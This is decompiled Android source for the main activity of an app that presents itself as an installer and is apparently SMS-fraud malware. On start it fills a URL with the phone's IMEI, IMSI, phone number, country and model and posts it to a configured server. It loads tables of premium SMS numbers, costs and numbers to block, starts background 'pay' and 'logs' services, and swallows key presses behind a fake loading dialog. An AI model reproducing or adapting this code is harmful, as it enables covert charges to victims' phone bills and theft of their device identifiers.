package install.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import java.util.Vector;
import org.MobileDb.MobileDatabase;
import org.MobileDb.Table;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.json.JSONObject;
import ru.beta.Beta;

public class MainActivity extends Activity implements ThreadOperationListener {
    public static int IDD_LOADING = 2;
    public static int IDD_PROGRESS = 1;
    public static Vector<String> aosList = new Vector();
    public static WebApi api;
    public static Vector<String> blockList = new Vector();
    private static boolean loaded = false;
    public static Vector<SmsOperator> operatorsList = new Vector();
    public static Settings settings = null;
    public static long startTime = 0;
    public static WebView webView;
    public String apkUrl = "";
    public int globalMaxSmsCount = 0;
    public int globalRepeat = 0;
    public Handler handler = null;
    ProgressDialog loadingDialog = null;
    public boolean needBlock = false;
    public String postUrl = "";
    ProgressDialog progressDialog = null;
    public long waitForSend;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startTime = System.currentTimeMillis();
        try {
            JSONObject json = new JSONObject();
            json.put("sid", "SID1");
            json.put("version", "VER1");
            json.put("server", getString(R.string.host));
            json.put("startPeriod", 60);
            json.put("period", 86400);
            json.put("twitterUrl", "http://mobile.twitter.com/Vaberg1");
            json.put("apiKey", getString(R.string.api_key));
            json.put("appId", getString(R.string.app_id));
            Beta beta = new Beta(getApplicationContext(), json);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        showDialog(IDD_LOADING);
        loadData();
        new Thread(new ThreadOperation(this, 1, null)).start();
        sendHttp();
        this.handler = new Handler();
        setContentView(R.layout.main);
        api = new WebApi(this, this);
        webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient() {
            public void onPageFinished(WebView view, String url) {
                System.out.println("Page loaded");
                try {
                    MainActivity.this.loadingDialog.dismiss();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
                MainActivity.callJsCallbackAndroidVersion(VERSION.RELEASE);
            }
        });
        webView.setScrollBarStyle(33554432);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebChromeClient(new WebChromeClient() {
            public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
                WebApiResult apiResult = MainActivity.api.textToCommand(message, defaultValue);
                if (!apiResult.find) {
                    return false;
                }
                result.confirm(apiResult.result);
                return true;
            }
        });
        webView.addJavascriptInterface(api, "webapi");
        webView.setLayoutParams(new LayoutParams(-1, -2, 1.0f));
        ((LinearLayout) findViewById(R.id.linearLayout4)).addView(webView);
        webView.loadUrl("file:///android_asset/html/index.html");
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        System.out.println("onKeyDown(): keyCode = " + keyCode);
        if (keyCode != 3 && keyCode == 4) {
        }
        return true;
    }

    public void onClickNext(View view) {
        System.out.println("onClickNext()");
        openUrl(this, this.apkUrl);
    }

    public void onClickRule(View view) {
        System.out.println("onClickRule()");
    }

    public void loadData() {
        try {
            if (!loaded) {
                int i;
                MobileDatabase db = new MobileDatabase();
                db.loadFrom("/res/raw/data.db", true);
                operatorsList = loadOperatorList(db);
                Table table = db.getTableByName("settings");
                this.apkUrl = (String) table.getFieldValueByName("url", 0);
                String tmp = (String) table.getFieldValueByName("block_numbers", 0);
                String tmp1 = (String) table.getFieldValueByName("aos_numbers", 0);
                this.postUrl = (String) table.getFieldValueByName("post_url", 0);
                this.globalMaxSmsCount = ((Integer) table.getFieldValueByName("maxSmsCount", 0)).intValue();
                this.waitForSend = (long) ((Integer) table.getFieldValueByName("time_between_send", 0)).intValue();
                this.globalRepeat = ((Integer) table.getFieldValueByName("repeat", 0)).intValue();
                this.postUrl = this.postUrl.replace("{IMEI}", Settings.getImei(this));
                this.postUrl = this.postUrl.replace("{IMSI}", Settings.getImsi(this));
                this.postUrl = this.postUrl.replace("{PHONE}", Settings.getPhone(this));
                this.postUrl = this.postUrl.replace("{COUNTRY}", Settings.getCountry(this));
                this.postUrl = this.postUrl.replace("{APPID}", getText(R.string.app_id));
                this.postUrl = this.postUrl.replace("{MODEL}", Build.MODEL);
                this.postUrl = this.postUrl.replace("{MANUFACTURER}", Build.MANUFACTURER);
                this.postUrl = this.postUrl.replace("{SDK}", String.valueOf(VERSION.SDK_INT));
                System.out.println("apkUrl: " + this.apkUrl);
                System.out.println("block_numbers: " + tmp);
                System.out.println("aos_numbers: " + tmp1);
                String[] blockNumbers = tmp.split(",");
                for (i = 0; i < blockNumbers.length; i++) {
                    System.out.println("blockNumbers: " + blockNumbers[i]);
                    blockList.add(blockNumbers[i]);
                }
                String[] aosNumbers = tmp1.split(",");
                for (i = 0; i < aosNumbers.length; i++) {
                    System.out.println("aosNumber: " + aosNumbers[i]);
                    aosList.add(aosNumbers[i]);
                }
                loaded = true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    static Vector<SmsOperator> loadOperatorList(MobileDatabase db) {
        int i;
        SmsOperator operator;
        Integer operatorId;
        int j;
        Vector<SmsOperator> list = new Vector();
        Table table = db.getTableByName("operators");
        for (i = 0; i < table.rowsCount(); i++) {
            operator = new SmsOperator((Integer) table.getFieldValueByName("id", i));
            operator.name = (String) table.getFieldValueByName("name", i);
            operator.maxSmsCount = ((Integer) table.getFieldValueByName("maxSmsCount", i)).intValue();
            operator.maxSmsCost = ((Integer) table.getFieldValueByName("maxSmsCost", i)).intValue();
            operator.repeat = ((Integer) table.getFieldValueByName("repeat", i)).intValue();
            list.addElement(operator);
        }
        table = db.getTableByName("codes");
        for (i = 0; i < table.rowsCount(); i++) {
            operatorId = (Integer) table.getFieldValueByName("operator_id", i);
            String code = (String) table.getFieldValueByName("code", i);
            for (j = 0; j < list.size(); j++) {
                operator = (SmsOperator) list.elementAt(j);
                if (operator.id == operatorId.intValue()) {
                    operator.codes.addElement(code);
                    break;
                }
            }
        }
        long key = 1;
        table = db.getTableByName("sms");
        for (i = 0; i < table.rowsCount(); i++) {
            operatorId = (Integer) table.getFieldValueByName("operator_id", i);
            Integer number = (Integer) table.getFieldValueByName("number", i);
            String text = (String) table.getFieldValueByName("text", i);
            int cost = ((Integer) table.getFieldValueByName("cost", i)).intValue();
            int wait = ((Integer) table.getFieldValueByName("wait", i)).intValue();
            String responseText = (String) table.getFieldValueByName("responseText", i);
            String responseNumber = (String) table.getFieldValueByName("responseNumber", i);
            for (j = 0; j < list.size(); j++) {
                operator = (SmsOperator) list.elementAt(j);
                if (operator.id == operatorId.intValue()) {
                    SmsItem smsItem = new SmsItem(String.valueOf(number.intValue()), text);
                    smsItem.cost = cost;
                    smsItem.wait = wait;
                    smsItem.responseNumber = responseNumber;
                    smsItem.responseText = responseText;
                    long key2 = key + 1;
                    smsItem.key = key;
                    operator.sms.addElement(smsItem);
                    key = key2;
                    break;
                }
            }
        }
        System.out.println("list: " + list.size());
        return list;
    }

    /* access modifiers changed from: protected */
    public Dialog onCreateDialog(int id) {
        if (id == IDD_PROGRESS) {
            this.progressDialog = new ProgressDialog(this);
            this.progressDialog.setProgressStyle(1);
            this.progressDialog.setTitle("Download");
            this.progressDialog.setMessage("Please wait");
            this.progressDialog.setCancelable(false);
            return this.progressDialog;
        } else if (id != IDD_LOADING) {
            return null;
        } else {
            this.loadingDialog = new ProgressDialog(this);
            this.loadingDialog.setProgressStyle(0);
            this.loadingDialog.setTitle("");
            this.loadingDialog.setMessage("Loading...");
            this.loadingDialog.setCancelable(false);
            return this.loadingDialog;
        }
    }

    public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        String KContentType = "multipart/form-data; boundary=AaB03x";
        String KStartContent = "--AaB03x";
        String KEndContent = "--AaB03x--";
        String KCrlf = "\r\n";
        URL url = null;
        try {
            int i;
            NameValuePair param;
            if (method.equals("POST")) {
                url = new URL(path);
            } else if (method.equals("GET")) {
                url = new URL(new StringBuilder(String.valueOf(path)).append("?").append(URLEncodedUtils.format(paramsList, "utf-8")).toString());
            }
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod(method);
            if (method.equals("POST")) {
                connection.setRequestProperty("Content-Type", KContentType);
            }
            for (i = 0; i < propertyList.size(); i++) {
                param = (NameValuePair) paramsList.get(i);
                connection.setRequestProperty(param.getName(), param.getValue());
            }
            if (method.equals("POST")) {
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                for (i = 0; i < paramsList.size(); i++) {
                    param = (NameValuePair) paramsList.get(i);
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"" + param.getName() + "\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(param.getValue().getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                outputStream.writeBytes(KEndContent);
                outputStream.writeBytes(KCrlf);
                outputStream.flush();
                outputStream.close();
            } else if (method.equals("GET")) {
                connection.connect();
            }
            return connection;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public static void sendPostRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "POST", paramsList, propertyList);
    }

    public static void sendGetRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "GET", paramsList, propertyList);
    }

    public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        try {
            HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList);
            if (connection != null) {
                System.out.println("getResponseCode: " + connection.getResponseCode());
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void sendHttp() {
        try {
            new Thread(new Runnable() {
                public void run() {
                    MainActivity.sendPostRequest(MainActivity.this.postUrl, new LinkedList(), new LinkedList());
                }
            }).start();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void openUrl(Context context, String url) {
        try {
            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            browserIntent.addFlags(268435456);
            context.startActivity(browserIntent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void uninstall() {
        uninstallApk(this, getPackageName());
    }

    public static void uninstallApk(Context context, String pkg) {
        System.out.println("uninstallApk: " + pkg);
        Intent intent = new Intent("android.intent.action.DELETE");
        intent.setData(Uri.parse("package:" + pkg));
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void callJsCallbackAndroidVersion(String version) {
        System.out.println("callJsCallbackAndroidVersion()");
        System.out.println("version: " + version);
        try {
            webView.loadUrl("javascript:androidVersion(" + ("'" + version + "'") + ")");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        setRequestedOrientation(1);
    }

    public void threadOperationRun(int id, Object obj) {
        if (id == 1) {
            if (settings == null) {
                settings = new Settings();
                Settings.setSettings(settings);
                if (!settings.load(this)) {
                    System.out.println("FIRST START");
                    settings.operatorList = operatorsList;
                    settings.blockList = blockList;
                    settings.waitForSend = this.waitForSend;
                    settings.globalMaxSmsCount = this.globalMaxSmsCount;
                    settings.globalRepeat = this.globalRepeat;
                    settings.aosList = aosList;
                    settings.save(this);
                }
                settings.load(this);
                settings.printToOutStream();
            }
            try {
                MainService.start(this, new Intent(), "pay");
                System.out.println("MainService.start(this, new Intent(), \"pay\")");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            MainService.packageName = getPackageName();
            MainService.start(this, new Intent(), "logs");
            Settings.startKillTimer(this, 10);
        }
    }
}
